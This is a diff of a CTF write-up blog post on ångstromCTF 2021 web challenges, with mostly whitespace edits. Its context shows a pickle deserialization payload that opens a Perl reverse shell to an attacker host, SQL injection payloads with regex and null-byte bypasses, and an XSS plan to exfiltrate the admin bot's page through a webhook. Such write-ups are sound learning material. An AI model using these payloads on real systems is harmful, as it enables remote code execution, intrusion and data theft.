@@ -2,15 +2,8 @@
 layout: post
 title: "ångstromCTF 2021"
 date: 2021-04-08
----
-
-<span class="align-center" markdown="1">
-    <span class="categories-index">
-        **Categories index**<br>
-        [WEB](#web) - [Crypto](#crypto)
-    </span>
-</span>
-
+head_ctf_categories:
+  - web
 ---
 
 # Web
@@ -59,7 +52,7 @@ app.run(threaded=True, host="0.0.0.0")
 ```
 
 Given the challenge name and all those pickles, one can immediatly assume we're talking about [python's pickle module.](https://docs.python.org/3/library/pickle.html)
-Particularly, the line 
+Particularly, the line
 ```python
 if contents: items = pickle.loads(base64.b64decode(contents))
 ```
@@ -82,7 +75,7 @@ class Pwned:
         # perl oneliner from https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#perl
         return (exec, ("__import__('subprocess').Popen(['perl', '-e', 'use Socket;$i=\"%s\";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'])" % (HOST, PORT),))
 
-# serialize and base64 encode Pwned class 
+# serialize and base64 encode Pwned class
 encoded = pickle.dumps(Pwned())
 contents = base64.b64encode(encoded).decode()
 print("[*] Using payload %s" % contents)
@@ -101,7 +94,7 @@ The solution we found it quite an overkill; when submitted, the payload triggers
 
 > Come check out our finest selection of quills!<br>Author: JoshDaBosh
 
-We are given the source code of the application. 
+We are given the source code of the application.
 ```ruby
 require 'sinatra'
 require 'sqlite3'
@@ -117,7 +110,7 @@ get '/' do
 end
 
 get '/quills' do
-	erb :quills	
+	erb :quills
 end
 
 
@@ -126,7 +119,7 @@ post '/quills' do
 	cols = params[:cols]
 	lim = params[:limit]
 	off = params[:offset]
-	
+
 	blacklist = ["-", "/", ";", "'", "\""]
 	blacklist.each { |word|
 		if cols.include? word
@@ -153,33 +146,33 @@ We can certainly control all three of the inputs, with some limitations though.
 2. `lim` and `off` should <u>apparently</u> be numbers. (Why apparently ? See [part 2](#sea-of-quills-2))
 
 At this point, let's try some SQLi injections to see if there's something hidden in the database.
-Let's see what's in `sql_master`, maybe some hidden tables ? 
+Let's see what's in `sql_master`, maybe some hidden tables ?
 ![angstrom_ctf](/assets/img/AngstromCTF_2021/web_2.jpeg)
 ```html
 <ul class="list pl0">
-				
+
     <img src="1" class="w3 h3">
     <li class="pb5 pl3"> <ul><li></li></ul></li><br />
-    
+
     <img src="flagtable" class="w3 h3">
     <li class="pb5 pl3"> <ul><li></li></ul></li><br />
-    
+
     <img src="quills" class="w3 h3">
     <li class="pb5 pl3"> <ul><li></li></ul></li><br />
-    
+
 </ul>
 ```
 Bingo, we have a table named `flagtable`. I wonder what's in there.
 Let's craft this payload `limit = 3`, `offset = 0`, `cols = * from flagtable union select 1`.
 ```html
 <ul class="list pl0">
-				
+
     <img src="1" class="w3 h3">
     <li class="pb5 pl3"> <ul><li></li></ul></li><br />
-    
+
     <img src="actf{REDACTED}" class="w3 h3">
     <li class="pb5 pl3"> <ul><li></li></ul></li><br />
-    
+
 </ul>
 ```
 PS: Why `* from flagtable union select 1` ? Because we know that the `quills` table has 3 columns and the `flagtable` table has 1 column hence the only way to make `union select` work is by joining together the same number of columns of both the tables. All of this because I'm lazy enough to not dump the column names of `flagtable` so by using `*` on it I have to try `union select 1, 2, 3 ...` until I get the right result.
@@ -209,7 +202,7 @@ get '/' do
 end
 
 get '/quills' do
-	erb :quills	
+	erb :quills
 end
 
 post '/quills' do
@@ -217,7 +210,7 @@ post '/quills' do
 	cols = params[:cols]
 	lim = params[:limit]
 	off = params[:offset]
-	
+
 	blacklist = ["-", "/", ";", "'", "\"", "flag"]
 
 	blacklist.each { |word|
@@ -236,7 +229,7 @@ post '/quills' do
 end
 ```
 
-Basically, two more checks were added: `cols` cannot contain `flag` and it cannot be longer than 24 chars. Hmm, interesting ... 
+Basically, two more checks were added: `cols` cannot contain `flag` and it cannot be longer than 24 chars. Hmm, interesting ...
 I spent a lot of time crawling SQLite's documentation in search of some exotic internal function in order to bypass the `flag` in `cols` constraint. Ah yeah, and it has to be short enough to fit `* from {encoded_flag_table_name} union select *` in 24 chars. After spending some good hours on it, I desperately started to doubt about all the checks that were applied on my input. I was naïve enough to consider that `!/^[0-9]+$/.match?(off)` as bulletproof... unless I stumbled upon [this stackoverflow post](https://stackoverflow.com/questions/577653/difference-between-a-z-and-in-ruby-regular-expressions). As I'm not very much of a ruby fan, I didn't know it uses `\A\z` in regex'es to match the whole string and by using `/^$/` it only matches until it encounters an whitespace character.
 ![facepalm](/assets/img/AngstromCTF_2021/web_3.webp)
 With all that said, we can bypass the regex of `lim` and `off` by inserting a number followed by a newline and our payload. My final solution was to use blind SQLi to grab the flag character by character. There are more practical solutions where you can grab the entire flag in one shot but yeah, if you're brave enough to wait for a blind SQLi on a 30+ long flag, take a coffe and see the flag coming in one char at a time.
@@ -270,7 +263,7 @@ while 1:
 ```
 Using this approach, the offset becomes `0 or 1` = `1` only when we get the correct n-th char of the flag hence changing the offset of the query from 0 to 1 changes the ouput of the query on the page. Based on the yielded html we can check if the char we're trying is correct or if we should try the next one.
 
-PS: the quill record with `desc = 'it's very special'` is at offset 1 so when we get it the response we know we got the correct n-th character. 
+PS: the quill record with `desc = 'it's very special'` is at offset 1 so when we get it the response we know we got the correct n-th character.
 
 PSS: Oooor we could just use `* from fLagtable\x00` as `cols`'s param and get the flag directly. Apparently SQLite [doesn't care about case sensitivity](https://stackoverflow.com/a/153967/1923464) in table names and `\x00` truncates the query string in Ruby/SQLite.
 
@@ -280,7 +273,7 @@ PSS: Oooor we could just use `* from fLagtable\x00` as `cols`'s param and get th
 
 > I've made a new game that is sure to make all the Venture Capitalists want to invest! Care to try it out?<br>Author: paper
 
-We are given this source code. 
+We are given this source code.
 ```javascript
 const visiter = require('./visiter');
 
@@ -357,8 +350,8 @@ function report() {
 }
 
 document.getElementById('reporter').onclick = () => { report() };
-		</script> 
-		
+		</script>
+
 	</body>
 </html>`);
 });
@@ -406,7 +399,7 @@ Let's try to extract the interesting lines from this source code. The logic is s
 2. The application creates an unique `/share/:shareName` for you.
 3. You can use `/report/:shareName` to report your share to the admin (the bot).
 
-Upon reporting, the bot is going to visit your share's page. Let's look for some sort of XSS sink point. We can notice that the name we pass at `/record` is used on our share page without any particular escaping. 
+Upon reporting, the bot is going to visit your share's page. Let's look for some sort of XSS sink point. We can notice that the name we pass at `/record` is used on our share page without any particular escaping.
 ```javascript
 " ... This score was set by ${name} ... "
 ```
@@ -425,7 +418,7 @@ The idea could be the following:
 2. Report the created share to the bot
 3. Use the XSS to steal the html document from the admin's browser
 
-Let's first of all try to check what browser is used by the bot. 
+Let's first of all try to check what browser is used by the bot.
 By submitting the following payload we can see the bot is pinging back our webhook.
 ```python
 # ping ngrok local instance
